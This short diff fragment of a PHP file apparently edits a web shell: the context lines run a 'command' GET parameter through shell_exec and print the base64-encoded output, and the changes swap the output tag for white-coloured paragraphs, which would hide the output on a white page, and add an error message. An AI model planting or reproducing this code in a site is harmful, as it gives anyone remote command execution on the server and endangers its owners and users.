@@ -6,9 +6,10 @@ if (isset($_GET['command'])) {
 
     $output = base64_encode(shell_exec($command));
 
-    echo "<pre>$output</pre>";
+    echo "<p color='white'>$output</p>";
 } else {
-  return 0;
+  echo "<p color='white'>GET parameters blank or not valid";
 }
 
 ?>
+
